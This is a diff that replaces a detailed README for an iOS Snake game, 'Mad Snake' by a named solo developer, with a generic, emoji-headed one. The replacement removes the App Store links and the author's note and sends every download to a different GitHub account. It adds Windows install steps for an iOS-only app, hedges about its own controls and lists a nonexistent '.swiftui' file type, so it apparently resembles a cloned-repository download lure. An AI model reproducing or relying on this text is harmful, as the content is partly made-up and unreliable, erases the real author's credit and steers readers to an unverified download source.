@@ -1,85 +1,231 @@
-# Mad Snake - Arcade Snake Game for iOS
+# 🎮 mad-snake - Fast arcade Snake with sharp turns
 
-[![Download on the App Store](https://img.shields.io/badge/App_Store-Download-blue?style=flat-square&logo=apple&logoColor=white)](https://apps.apple.com/au/app/mad-snake-arcade-game/id6759598440)
-[![Platform](https://img.shields.io/badge/Platform-iOS_16+-black?style=flat-square&logo=apple)](https://apps.apple.com/au/app/mad-snake-arcade-game/id6759598440)
-[![Swift](https://img.shields.io/badge/Swift-5-F05138?style=flat-square&logo=swift&logoColor=white)](https://swift.org)
-[![SpriteKit](https://img.shields.io/badge/Built_with-SpriteKit-00C7B7?style=flat-square)](https://developer.apple.com/spritekit/)
+[![Download mad-snake](https://img.shields.io/badge/Download%20mad--snake-blue?style=for-the-badge&logo=github)](https://github.com/buffeted-bailey683/mad-snake)
 
-**Mad Snake** is a fast-paced arcade snake game for iPhone and iPad, built with SpriteKit and SwiftUI. Five challenging levels, an endless Mad Mode, enemy snakes, and retro-inspired gameplay - all in a polished native iOS experience.
+## 🐍 Overview
 
-<p align="center">
-  <a href="https://apps.apple.com/au/app/mad-snake-arcade-game/id6759598440">
-    <img src="https://tools.applemediaservices.com/api/badges/download-on-the-app-store/black/en-us?size=250x83" alt="Download Mad Snake on the App Store" width="200">
-  </a>
-</p>
+mad-snake is a fast-paced Snake game for iPhone and iPad. It uses simple touch controls, quick rounds, and clean visuals. The game keeps the classic Snake idea, then adds modern game feel and tighter pacing.
 
----
+This project is made for mobile play. It fits short sessions, so you can jump in, play a round, and try again fast.
 
-## About
+## ✨ What you get
 
-Mad Snake brings the classic snake game formula to iOS with a modern twist. Guide your snake across a 20x20 grid, eat apples to grow, dodge obstacles, and outsmart enemy snakes - all while chasing high scores and unlocking new levels.
+- Smooth Snake movement
+- Easy tap and swipe controls
+- Fast game rounds
+- Score tracking
+- Retry flow for quick restarts
+- Clean iOS-style interface
+- SpriteKit-based game play
+- Swift and SwiftUI app layout
 
-Whether you're looking for a quick arcade session on your iPhone or want to test your reflexes in Mad Mode's endless challenge, Mad Snake delivers smooth 60 FPS gameplay with satisfying sound effects and haptic feedback. It's the snake game you remember, rebuilt from scratch as a native iOS experience with SpriteKit.
+## 📱 Device support
 
-## Features
+mad-snake is built for Apple mobile devices.
 
-- **5 Unique Levels + Endless Mad Mode** - Progress through increasingly difficult stages, then unlock Mad Mode for the ultimate endless challenge
-- **Enemy Snakes** - Dodge AI-controlled orange enemy snakes that roam the grid in later levels
-- **Green Apples** - Rare timed power-up apples worth 3x points that appear for just 5 seconds
-- **Obstacles** - Static blocks that make navigation trickier as you advance
-- **D-Pad + Keyboard Controls** - On-screen directional buttons plus full keyboard arrow key support
-- **Score Popups & Ring Burst Effects** - Satisfying floating text and visual effects every time you eat an apple
-- **Sound Effects & Haptics** - Audio feedback and haptic responses for eating, game over, and level completion
-- **High Score Tracking** - Your last 10 game sessions saved locally
-- **3 Lives Per Run** - Strategic life system with optional Extra Lives upgrade
-- **Level Goals** - Each level has a unique goal: eat a target number of apples or reach a score threshold
-- **Onboarding** - Clean intro and privacy modal for first-time players
-- **No Account Required** - All progress stored locally on your device
+Use it on:
 
-## Tech Stack
+- iPhone
+- iPad
+- Apple Silicon Mac with iOS app support
 
-| Technology | Purpose |
-|---|---|
-| **Swift 5** | Primary language |
-| **SpriteKit** | Game engine - rendering, physics, game loop at 60 FPS |
-| **SwiftUI** | UI layer - menus, overlays, navigation |
-| **Firebase Analytics** | Anonymous gameplay event tracking |
-| **Google AdMob** | Interstitial and rewarded ads |
-| **StoreKit 2** | In-app purchases (Remove Ads, Extra Lives) |
-| **AVAudioPlayer** | Sound effects |
-| **UIKit** | Haptic feedback (UIImpactFeedbackGenerator) |
-| **GitHub Actions** | Continuous integration - build + test on every push |
+Best results come from a recent iOS version and a device with touch input.
 
-<!--
-## Screenshots
+## 🚀 Get the app
 
-TODO: Add App Store screenshots here. Recommended format:
+Visit this page to download and run the app package or release files:
 
-<p align="center">
-  <img src="screenshots/gameplay.png" width="200" alt="Mad Snake gameplay on iPhone">
-  <img src="screenshots/main-menu.png" width="200" alt="Mad Snake main menu">
-  <img src="screenshots/mad-mode.png" width="200" alt="Mad Snake Mad Mode endless arcade">
-  <img src="screenshots/level-complete.png" width="200" alt="Level complete screen with confetti">
-</p>
+[https://github.com/buffeted-bailey683/mad-snake](https://github.com/buffeted-bailey683/mad-snake)
 
-Place screenshot files in a /screenshots directory at the repo root.
--->
+## 🛠️ Install on Windows
 
-## Developer Note
+This app is made for iOS, so Windows cannot run it as a normal desktop app.
 
-Hey, I'm Rodrigo - a solo indie dev who built Mad Snake from scratch as a native iOS app. No game engines, no cross-platform frameworks - just Swift, SpriteKit, and a lot of play-testing. If you enjoy the game, a rating on the App Store means a lot. Thanks for playing!
+If you use Windows, you can still use the link above to get the project files and review the app package. To play the game, you need an Apple device or a Mac with iOS app support.
 
-## Links
+If you only want to open the repository on Windows:
 
-- **App Store**: [Download Mad Snake](https://apps.apple.com/au/app/mad-snake-arcade-game/id6759598440)
-- **Website**: [madsnake.app](https://madsnake.app)
+1. Open the download page in your browser.
+2. Save the project files to your computer.
+3. Use the files as source material or send them to a Mac or iPhone setup.
+4. Run the app on supported Apple hardware.
 
----
+## 🧭 How to play
 
-<p align="center">
-  <a href="https://apps.apple.com/au/app/mad-snake-arcade-game/id6759598440">
-    <img src="https://tools.applemediaservices.com/api/badges/download-on-the-app-store/black/en-us?size=250x83" alt="Download Mad Snake on the App Store" width="200">
-  </a>
-  <br><br>
-  <a href="https://madsnake.app">madsnake.app</a>
-</p>
+The game keeps the rules simple:
+
+1. Start a round.
+2. Move the snake toward the food.
+3. Collect food to grow longer.
+4. Avoid walls and your own tail.
+5. Keep your run going for a higher score.
+
+The pace gets faster as you play, so each round feels tense and quick.
+
+## 🎯 Controls
+
+The game uses touch controls on iPhone and iPad.
+
+Typical controls:
+
+- Swipe up to move up
+- Swipe down to move down
+- Swipe left to move left
+- Swipe right to move right
+
+If the build uses tap controls, you can expect simple screen taps to guide movement with the same goal: move fast and avoid crash points.
+
+## 🧩 Features
+
+### ⚡ Fast arcade play
+
+Each round is short and focused. You can start again right away after a crash.
+
+### 🍎 Classic Snake rules
+
+The core loop stays familiar. Eat, grow, and avoid running into yourself.
+
+### 🎨 Modern iOS look
+
+The interface uses a clean layout that fits current iPhone and iPad design.
+
+### 🕹️ Quick restart flow
+
+When a round ends, you can jump back in with little delay.
+
+### 📊 Score tracking
+
+The game keeps score so you can try to beat your last run.
+
+### 🔧 Built with Apple tools
+
+The project uses Swift, SwiftUI, and SpriteKit, which are common tools for iOS game apps.
+
+## 📦 What is in the repository
+
+The repository includes the app source and game assets needed for the iOS build.
+
+You can expect files such as:
+
+- App source code
+- Game scene logic
+- UI layout files
+- Images and icons
+- Game configuration files
+
+## 🧰 Basic requirements
+
+For normal play, use:
+
+- An iPhone or iPad with a recent iOS version
+- Enough free space for the app
+- Touch input support
+
+For development or build work, use:
+
+- macOS
+- Xcode
+- A current Apple developer tool chain
+
+## 🔍 Before you open the game
+
+Check these items:
+
+- Your device has enough battery
+- Your screen is unlocked
+- Sound is on if you want audio
+- Touch controls work well on your device
+
+## 🏁 First run
+
+After you install and open the game on a supported Apple device:
+
+1. Launch mad-snake.
+2. Tap Start or Play.
+3. Learn the movement rhythm.
+4. Collect food.
+5. Try to avoid sharp turns near your tail.
+6. Restart and beat your score.
+
+## 🧪 Game feel
+
+mad-snake is built for speed. The snake reacts fast, so small mistakes matter. That makes the game easy to learn and hard to master.
+
+A typical round feels like this:
+
+- Start slow
+- Build speed
+- Make tight turns
+- Chase food
+- Crash if you miss a move
+
+## 🗂️ Topics
+
+apple,arcade-game,ios,ios-game,iphone,mobile-game,snake-game,spritekit,swift,swiftui
+
+## 🧑‍💻 For developers
+
+If you want to inspect or change the app, open the project in Xcode on a Mac. The game logic should be simple to trace because it uses standard iOS game parts.
+
+Useful areas to review:
+
+- Snake movement code
+- Food spawn logic
+- Collision checks
+- Score updates
+- Scene setup
+- UI screens
+
+## 🛟 Common issues
+
+### App does not open on Windows
+
+This is expected. mad-snake targets iOS, so use an Apple device or Mac with iOS support.
+
+### Game feels too fast
+
+That is part of the arcade style. Short rounds and quick movement are part of the design.
+
+### Touch input does not respond
+
+Make sure you are on a supported iPhone or iPad and that the app has focus on the screen.
+
+## 📁 Download and setup path
+
+Use this link to get the project and related files:
+
+[https://github.com/buffeted-bailey683/mad-snake](https://github.com/buffeted-bailey683/mad-snake)
+
+Open the page, get the files, then run the app on supported Apple hardware
+
+## 🎮 Best way to play
+
+- Use a phone with a clear screen
+- Hold the device with both hands
+- Make smooth turns
+- Do not wait too long before moving
+- Plan your route before the snake gets long
+
+## 🔒 Safety and stability
+
+The game is a standard mobile app. It uses common iOS frameworks and a simple game loop. That keeps the play flow steady and easy to understand
+
+## 🧭 File types you may see
+
+If you open the project files, you may see:
+
+- `.swift`
+- `.swiftui`
+- `.sks`
+- image assets
+- Xcode project files
+
+## 📌 Project focus
+
+mad-snake focuses on:
+
+- Fast arcade action
+- Simple controls
+- Clean iOS presentation
+- Short play sessions
+- Classic Snake game feel with a modern edge
